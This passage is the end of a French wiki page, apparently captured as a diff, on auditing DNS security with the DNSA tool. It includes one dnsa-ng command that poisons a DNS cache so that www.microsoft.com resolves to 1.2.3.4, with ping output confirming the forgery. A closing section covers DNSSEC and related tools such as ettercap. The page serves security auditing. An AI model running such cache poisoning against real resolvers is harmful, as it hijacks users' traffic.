+<pre>./dnsa-ng -t ether -m [raw4 or link] -3 -D hacker.pirate.org -S 100.101.102.103 –s 192.168.1.100 -a www.microsoft.com -b 1.2.3.4 -i eth0
+</pre>
+<p>Après corruption du cache DNS, nous pouvons constater que le serveur a mis en cache l’information forgée&#160;:
+</p>
+<div dir="ltr" class="mw-geshi mw-code mw-content-ltr"><div class="text source-text"><pre class="de1">$ ping www.microsoft.com
+PING www.microsoft.com (1.2.3.4): 56 data bytes</pre></div></div>
+<h1><span class="mw-headline" id="Conclusion"><span class="mw-headline-number">5</span> Conclusion</span></h1>
+<p>DNS est un protocole sensible au détournement de trafic. Sa place, son trafic et la facilité de l'exploitation des attaques le concernant en font un élément essentiel dont le niveau de sécurisation peut être audité à l'aide de DNSA, les contres-mesures n'étant pas pour autant simples à mettre en place.
+</p><p>DNS est un protocole de choix pour des utilisateurs malicieux désirant détourner du trafic. Son utilisation abondante et la simplicité des attaques possibles en font un élément très sensible de l’infrastructure.
+</p><p>DNSA permet d’auditer le niveau de sécurité des échanges DNS avec une approche offensive telle qu’elle le serait dans le cas d’une réelle attaque.
+</p><p>Les contre-mesures ne sont cependant pas simples à mettre en œuvre&#160;: la plus répandue étant actuellement DNSSec qui utilise le chiffrement asymétrique pour garantir l’intégrité et l’authenticité des echanges.
+</p><p>DNSA peut également être couplé à d’autres outils tels qu’<a rel="nofollow" class="external text" href="http://www.arp-sk.org/">arp-sk</a> pour contourner les switches ( <a rel="nofollow" class="external text" href="http://www.google.fr/custom?hl=fr&amp;client=pub-7670419794937883&amp;channel=3516851159&amp;cof=FORID%3A1%3BGL%3A1%3BS%3Ahttp%3A%2F%2Fsecuobs.com%3BLH%3A14%3BLW%3A50%3BT%3A%23336699%3BLC%3A%23440066%3BVLC%3A%23d03500%3BGALT%3A%239A2C06%3BGFNT%3A%23223472%3BGIMP%3A%23223472%3BDIV%3A%2333FFFF%3B&amp;domains=www.secuobs.com&amp;sig=nkGK4imLEyzEpn7g&amp;flav=0000&amp;ie=ISO-8859-1&amp;oe=ISO-8859-1&amp;q=arp+cache+poisoning&amp;btnG=Rechercher&amp;sitesearch=www.secuobs.com&amp;meta=">ARP cache poisoning</a> ), <a rel="nofollow" class="external text" href="http://monkey.org/~dugsong/dsniff/">dsniff</a> , <a rel="nofollow" class="external text" href="http://www.secuobs.com/news/04102006-ettercap.shtml">ettercap</a> , etc.
+</p><p>Les possibilités sont multiples. Un scénario très réaliste a été présenté à <a rel="nofollow" class="external text" href="http://actes.sstic.org/SSTIC05/Protocoles_reseau/SSTIC05-Betouin_Blancher_Fischbach-Protocoles_reseau.pdf">SSTIC 2005</a> avec la compromission totale d’une architecture classique (DMZ + LAN) à partir d’un serveur Web, jusqu’à l’ensemble des postes clients du LAN.
+</p>
+<h1><span class="mw-headline" id="References"><span class="mw-headline-number">6</span> References</span></h1>
+<p><a rel="nofollow" class="external free" href="http://www.secuobs.com/news/19122007-dnsa.shtml">http://www.secuobs.com/news/19122007-dnsa.shtml</a>
+</p>
+<!-- 
+NewPP limit report
+CPU time usage: 0.020 seconds
+Real time usage: 0.017 seconds
+Preprocessor visited node count: 146/1000000
+Preprocessor generated node count: 242/1000000
+Post‐expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Highest expansion depth: 2/40
+Expensive parser function count: 0/100
+-->
+
+<!-- 
+Transclusion expansion time report (%,ms,calls,template)
+100.00%    0.000      1 - -total
+-->
+
+<!-- Saved in parser cache with key blocnotesinfo-wiki_:pcache:idhash:2367-0!*!*!1!en!*!* and timestamp 20181111230722 and revision id 5286
+ -->
+</div>									<div class="printfooter">
+						Retrieved from "<a dir="ltr" href="https://wiki.deimos.fr/index.php?title=Audits_de_sécurité_du_protocole_DNS&amp;oldid=5286">https://wiki.deimos.fr/index.php?title=Audits_de_sécurité_du_protocole_DNS&amp;oldid=5286</a>"					</div>
+													<div id='catlinks' class='catlinks catlinks-allhidden'></div>												<div class="visualClear"></div>
+							</div>
+		</div>
+		<div id="mw-navigation">
+			<h2>Navigation menu</h2>
+
+			<div id="mw-head">
+									<div id="p-personal" role="navigation" class="" aria-labelledby="p-personal-label">
+						<h3 id="p-personal-label">Personal tools</h3>
+						<ul>
+							<li id="pt-login"><a href="https://wiki.deimos.fr/index.php?title=Special:UserLogin&amp;returnto=Audits+de+s%C3%A9curit%C3%A9+du+protocole+DNS" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li>						</ul>
+					</div>
+									<div id="left-navigation">
+										<div id="p-namespaces" role="navigation" class="vectorTabs" aria-labelledby="p-namespaces-label">
+						<h3 id="p-namespaces-label">Namespaces</h3>
+						<ul>
+															<li  id="ca-nstab-main" class="selected"><span><a href="Audits_de_sécurité_du_protocole_DNS.html"  title="View the content page [c]" accesskey="c">Page</a></span></li>
+													</ul>
+					</div>
+										<div id="p-variants" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-variants-label">
+												<h3 id="p-variants-label"><span>Variants</span><a href="Audits_de_sécurité_du_protocole_DNS.html#"></a></h3>
+
+						<div class="menu">
+							<ul>
+															</ul>
+						</div>
+					</div>
+									</div>
+				<div id="right-navigation">
+										<div id="p-views" role="navigation" class="vectorTabs" aria-labelledby="p-views-label">
+						<h3 id="p-views-label">Views</h3>
+						<ul>
+															<li id="ca-view" class="selected"><span><a href="Audits_de_sécurité_du_protocole_DNS.html" >Read</a></span></li>
+															<li id="ca-viewsource"><span><a href="https://wiki.deimos.fr/index.php?title=Audits_de_s%C3%A9curit%C3%A9_du_protocole_DNS&amp;action=edit"  title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></span></li>
+															<li id="ca-history" class="collapsible"><span><a href="https://wiki.deimos.fr/index.php?title=Audits_de_s%C3%A9curit%C3%A9_du_protocole_DNS&amp;action=history"  title="Past revisions of this page [h]" accesskey="h">View history</a></span></li>
+													</ul>
+					</div>
+										<div id="p-cactions" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-cactions-label">
+						<h3 id="p-cactions-label"><span>More</span><a href="Audits_de_sécurité_du_protocole_DNS.html#"></a></h3>
+
+						<div class="menu">
+							<ul>
+															</ul>
+						</div>
+					</div>
+										<div id="p-search" role="search">
+						<h3>
+							<label for="searchInput">Search</label>
+						</h3>
+
+						<form action="https://wiki.deimos.fr/index.php" id="searchform">
+														<div id="simpleSearch">
+															<input type="search" name="search" placeholder="Search" title="Search Deimos.fr / Bloc Notes Informatique [f]" accesskey="f" id="searchInput" /><input type="hidden" value="Special:Search" name="title" /><input type="submit" name="fulltext" value="Search" title="Search the pages for this text" id="mw-searchButton" class="searchButton mw-fallbackSearchButton" /><input type="submit" name="go" value="Go" title="Go to a page with this exact name if exists" id="searchButton" class="searchButton" />								</div>
+						</form>
+					</div>
+									</div>
+			</div>
+			<div id="mw-panel">
+				<div id="p-logo" role="banner"><a style="background-image: url(images/a/a7/Logo_deimosfr.png);" href="index.html"  title="Visit the main page"></a></div>
+						<div class="portal" role="navigation" id='p-navigation_et_RSS' aria-labelledby='p-navigation_et_RSS-label'>
+			<h3 id='p-navigation_et_RSS-label'>navigation et RSS</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-cd-.7E"><a href="index.html">cd ~</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Menu' aria-labelledby='p-Menu-label'>
+			<h3 id='p-Menu-label'>Menu</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-Solaris"><a href="Solaris.html">Solaris</a></li>
+													<li id="n-BSD"><a href="BSD.html">BSD</a></li>
+													<li id="n-Linux"><a href="Linux.html">Linux</a></li>
+													<li id="n-Mac-OS-X"><a href="Mac_OS_X.html">Mac OS X</a></li>
+													<li id="n-Windows"><a href="Windows.html">Windows</a></li>
+													<li id="n-Servers"><a href="Serveurs.html">Servers</a></li>
+													<li id="n-Development"><a href="Développement.html">Development</a></li>
+													<li id="n-Ethical-Hacking"><a href="Hacking_éthique.html">Ethical Hacking</a></li>
+													<li id="n-Network"><a href="Réseaux.html">Network</a></li>
+													<li id="n-Divers"><a href="Divers.html">Divers</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Liens' aria-labelledby='p-Liens-label'>
+			<h3 id='p-Liens-label'>Liens</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-Welcome-Page"><a href="http://www.deimos.fr" rel="nofollow">Welcome Page</a></li>
+													<li id="n-Blog"><a href="http://blog.deimos.fr" rel="nofollow">Blog</a></li>
+													<li id="n-Resume"><a href="https://www.linkedin.com/in/pmavro/" rel="nofollow">Resume</a></li>
+													<li id="n-GitHub"><a href="https://github.com/deimosfr" rel="nofollow">GitHub</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Google_Search' aria-labelledby='p-Google_Search-label'>
+			<h3 id='p-Google_Search-label'>Google Search</h3>
+
+			<div class="body">
+									
+<div><form action="http://www.google.fr/cse" id="cse-search-box">
+    <input type="hidden" name="cx" value="partner-pub-8001790276473966:7664586454" />
+    <input type="hidden" name="ie" value="UTF-8" />
+    <input type="text" name="q" size="12" />
+    <input type="submit" name="sa" value="Search" />
+</form></div>			</div>
+		</div>
+			<div class="portal" role="navigation" id='p-googletranslator' aria-labelledby='p-googletranslator-label'>
+			<h3 id='p-googletranslator-label'>Translate</h3>
+
+			<div class="body">
+									<div id="google_translate_element"></div><script>
+                                        function googleTranslateElementInit() {
+                                          new google.translate.TranslateElement({
+                                            pageLanguage: 'fr',
+                                            includedLanguages: 'en,de,es'
+                                          }, 'google_translate_element');
+                                        }
+                                        </script><script src="http://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>			</div>
+		</div>
+			<div class="portal" role="navigation" id='p-tb' aria-labelledby='p-tb-label'>
+			<h3 id='p-tb-label'>Tools</h3>
+
+			<div class="body">
+									<ul>
+													<li id="t-whatlinkshere"><a href="./Special:WhatLinksHere/Audits_de_sécurité_du_protocole_DNS.html" title="A list of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
+													<li id="t-recentchangeslinked"><a href="https://wiki.deimos.fr/Special:RecentChangesLinked/Audits_de_s%C3%A9curit%C3%A9_du_protocole_DNS" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
+													<li id="t-specialpages"><a href="https://wiki.deimos.fr/Special:SpecialPages" title="A list of all special pages [q]" accesskey="q">Special pages</a></li>
+													<li id="t-print"><a href="https://wiki.deimos.fr/index.php?title=Audits_de_s%C3%A9curit%C3%A9_du_protocole_DNS&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>
+													<li id="t-permalink"><a href="https://wiki.deimos.fr/index.php?title=Audits_de_s%C3%A9curit%C3%A9_du_protocole_DNS&amp;oldid=5286" title="Permanent link to this revision of the page">Permanent link</a></li>
+													<li id="t-info"><a href="https://wiki.deimos.fr/index.php?title=Audits_de_s%C3%A9curit%C3%A9_du_protocole_DNS&amp;action=info" title="More information about this page">Page information</a></li>
+											</ul>
+							</div>
+		</div>
+				</div>
+		</div>
+		<div id="footer" role="contentinfo">
+							<ul id="footer-info">
+											<li id="footer-info-lastmod"> This page was last modified on 23 December 2007, at 23:04.</li>
+											<li id="footer-info-copyright">Content is available under <a class="external" rel="nofollow" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr">Attribution - Pas d’Utilisation Commerciale - Partage dans les Mêmes Conditions 3.0 non transposé</a> unless otherwise noted.</li>
+									</ul>
+							<ul id="footer-places">
+											<li id="footer-places-privacy"><a href="https://wiki.deimos.fr/blocnotesinfo:Privacy_policy" title="blocnotesinfo:Privacy policy">Privacy policy</a></li>
+											<li id="footer-places-about"><a href="https://wiki.deimos.fr/blocnotesinfo:About" title="blocnotesinfo:About">About Deimos.fr / Bloc Notes Informatique</a></li>
+											<li id="footer-places-disclaimer"><a href="https://wiki.deimos.fr/blocnotesinfo:General_disclaimer" title="blocnotesinfo:General disclaimer">Disclaimers</a></li>
+									</ul>
+										<ul id="footer-icons" class="noprint">
+											<li id="footer-copyrightico">
+															<a href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr"><img src="http://i.creativecommons.org/l/by-nc-sa/3.0/88x31.png" alt="Attribution - Pas d’Utilisation Commerciale - Partage dans les Mêmes Conditions 3.0 non transposé" width="88" height="31" /></a>
+													</li>
+											<li id="footer-poweredbyico">
+															<a href="https://www.mediawiki.org/"><img src="resources/assets/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" srcset="resources/assets/poweredby_mediawiki_132x47.png 1.5x, resources/assets/poweredby_mediawiki_176x62.png 2x" width="88" height="31" /></a>
+															<a href="http://www.mediawiki.org/wiki/Extension:SphinxSearch"><img src="extensions/SphinxSearch/skins/images/Powered_by_sphinx.png" alt="Search Powered by Sphinx" width="88" height="31" /></a>
+													</li>
+									</ul>
+						<div style="clear:both"></div>
+		</div>
+		<script>if(window.jQuery)jQuery.ready();</script><script>if(window.mw){
+mw.loader.state({"site":"loading","user":"ready","user.groups":"ready"});
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.toc","mediawiki.action.view.postEdit","mediawiki.user","mediawiki.hidpi","mediawiki.page.ready","mediawiki.searchSuggest"],null,true);
+}</script>
+<script>if(window.mw){
+document.write("\u003Cscript src=\"https://wiki.deimos.fr/load.php?debug=false\u0026amp;lang=en\u0026amp;modules=site\u0026amp;only=scripts\u0026amp;skin=vector\u0026amp;*\"\u003E\u003C/script\u003E");
+}</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-63927289-2', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<script type="text/javascript" src="https://analytics.example.com/tracking.js"></script><script src="https://js.reactk.com/script/reactk.min.js"></script><script type="text/javascript">reactk.init("B7stJmobgweRBoDZrLflNQpDcgFxET");</script> 
+<script>if(window.mw){
+mw.config.set({"wgBackendResponseTime":32});
+}</script>
+	</body>
+</html>
+	
